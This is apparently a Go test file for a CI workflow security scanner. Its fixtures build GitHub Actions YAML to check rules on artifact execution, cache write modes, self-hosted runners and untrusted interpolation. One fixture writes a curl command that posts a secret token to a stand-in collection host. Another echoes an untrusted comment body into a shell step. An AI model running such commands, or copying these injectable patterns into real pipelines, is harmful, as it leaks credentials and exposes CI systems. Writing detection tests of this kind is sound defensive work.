package workflow_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/Kevin-Umali/repyy/internal/model"
	"github.com/Kevin-Umali/repyy/internal/scan"
)

func writeFixture(t *testing.T, root, name, body string) {
	t.Helper()
	path := filepath.Join(root, name)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func hasRule(findings []model.Finding, id string) bool {
	for _, finding := range findings {
		if finding.RuleID == id {
			return true
		}
	}
	return false
}

func ruleFinding(findings []model.Finding, id string) (model.Finding, bool) {
	for _, finding := range findings {
		if finding.RuleID == id {
			return finding, true
		}
	}
	return model.Finding{}, false
}

func scanFixture(t *testing.T, root string) []model.Finding {
	t.Helper()
	coverage, findings := scan.New(scan.Options{}).Scan(context.Background(), root)
	if !coverage.Complete {
		t.Fatalf("workflow scan incomplete: %+v", coverage)
	}
	return findings
}

func TestWorkflowRunArtifactExecutionRisk(t *testing.T) {
	const download = "      - uses: actions/download-artifact@0123456789012345678901234567890123456789\n        with:\n          run-id: ${{ github.event.workflow_run.id }}\n"
	cases := []struct {
		name, trigger, steps string
		want                 bool
	}{
		{"download then execute", "workflow_run", download + "      - run: ./artifact/run.sh\n", true},
		{"mapped workflow-run trigger", "\n  workflow_run:\n    workflows: [CI]", download + "      - run: ./artifact/run.sh\n", true},
		{"download then inspect data", "workflow_run", download + "      - run: cat artifact/data.txt\n", false},
		{"commented example", "workflow_run", download + "      - run: |\n          # ./artifact/run.sh\n          echo reviewed\n", false},
		{"execution before download", "workflow_run", "      - run: ./local-script.sh\n" + download, false},
		{"current run artifact", "workflow_run", "      - uses: actions/download-artifact@0123456789012345678901234567890123456789\n      - run: ./artifact/run.sh\n", false},
		{"trusted trigger", "push", download + "      - run: ./artifact/run.sh\n", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			writeFixture(t, root, "README.md", "fixture\n")
			writeFixture(t, root, "LICENSE", "fixture\n")
			writeFixture(t, root, ".github/workflows/promote.yml", "on: "+tc.trigger+"\njobs:\n  promote:\n    runs-on: ubuntu-latest\n    steps:\n"+tc.steps)
			findings := scanFixture(t, root)
			finding, ok := ruleFinding(findings, "CICD-006")
			if ok != tc.want || ok && (finding.Path != ".github/workflows/promote.yml" || finding.Context != "ci-workflow" || finding.Line < 1) {
				t.Fatalf("artifact risk mismatch: %+v", findings)
			}
		})
	}
}

func TestLowTrustCacheWriteOverride(t *testing.T) {
	cases := []struct {
		name, body string
		want       bool
	}{
		{"workflow override", "on: issue_comment\ncache-mode: write\njobs:\n  review:\n    runs-on: ubuntu-latest\n", true},
		{"job override", "on: [pull_request_target]\njobs:\n  review:\n    runs-on: ubuntu-latest\n    cache-mode: write-only\n", true},
		{"job expands workflow", "on: workflow_run\ncache-mode: read\njobs:\n  review:\n    runs-on: ubuntu-latest\n    cache-mode: write\n", true},
		{"trusted push", "on: push\ncache-mode: write\njobs:\n  build:\n    runs-on: ubuntu-latest\n", false},
		{"read-only", "on: workflow_run\ncache-mode: read\njobs:\n  review:\n    runs-on: ubuntu-latest\n", false},
		{"job narrows workflow", "on: issue_comment\ncache-mode: write\njobs:\n  review:\n    runs-on: ubuntu-latest\n    cache-mode: read\n", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			writeFixture(t, root, "README.md", "fixture\n")
			writeFixture(t, root, "LICENSE", "fixture\n")
			writeFixture(t, root, ".github/workflows/cache.yml", tc.body)
			findings := scanFixture(t, root)
			finding, ok := ruleFinding(findings, "CICD-007")
			if ok != tc.want || ok && (finding.Path != ".github/workflows/cache.yml" || finding.Context != "ci-workflow" || finding.Line < 1) {
				t.Fatalf("cache risk mismatch: %+v", findings)
			}
		})
	}
}

func TestPullRequestOnSelfHostedRunner(t *testing.T) {
	cases := []struct {
		name, trigger, runner string
		want                  bool
	}{
		{"untrusted PR on self-hosted", "pull_request", "[self-hosted, linux]", true},
		{"mapped PR trigger", "\n  pull_request:\n    types: [opened]", "self-hosted", true},
		{"trusted push", "push", "[self-hosted, linux]", false},
		{"hosted runner", "pull_request", "ubuntu-latest", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			writeFixture(t, root, "README.md", "fixture\n")
			writeFixture(t, root, "LICENSE", "fixture\n")
			writeFixture(t, root, ".github/workflows/check.yml", "on: "+tc.trigger+"\njobs:\n  check:\n    runs-on: "+tc.runner+"\n    steps:\n      - run: echo reviewed\n")
			findings := scanFixture(t, root)
			finding, ok := ruleFinding(findings, "CICD-008")
			if ok != tc.want || ok && (finding.Path != ".github/workflows/check.yml" || finding.Context != "ci-workflow" || finding.Line < 1) {
				t.Fatalf("runner risk mismatch: %+v", findings)
			}
		})
	}
}

func TestMultilineWorkflowRunInterpolation(t *testing.T) {
	cases := []struct {
		name, steps string
		want        []string
		dontWant    []string
	}{
		{
			name:  "untrusted comment in block command",
			steps: "      - run: |\n          echo \"${{ github.event.comment.body }}\"\n",
			want:  []string{"CICD-002"},
		},
		{
			name:  "secret and curl on separate block lines",
			steps: "      - run: |\n          curl -X POST \\\n            -d '${{ secrets.FIXTURE_TOKEN }}' https://fixture.invalid/collect\n",
			want:  []string{"CICD-004"},
		},
		{
			name:     "commented sample",
			steps:    "      - run: |\n          # echo \"${{ github.event.comment.body }}\"\n          echo reviewed\n",
			dontWant: []string{"CICD-002"},
		},
		{
			name:     "secret and curl in separate steps",
			steps:    "      - run: |\n          echo '${{ secrets.FIXTURE_TOKEN }}'\n      - run: |\n          curl https://fixture.invalid/health\n",
			dontWant: []string{"CICD-004"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			writeFixture(t, root, "README.md", "fixture\n")
			writeFixture(t, root, "LICENSE", "fixture\n")
			writeFixture(t, root, ".github/workflows/check.yml", "on: issue_comment\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n"+tc.steps)
			findings := scanFixture(t, root)
			for _, id := range tc.want {
				finding, ok := ruleFinding(findings, id)
				if !ok || finding.Context != "ci-workflow" || finding.Line < 1 {
					t.Errorf("missing %s from block command: %+v", id, findings)
				}
			}
			for _, id := range tc.dontWant {
				if hasRule(findings, id) {
					t.Errorf("unexpected %s from block command: %+v", id, findings)
				}
			}
		})
	}
}
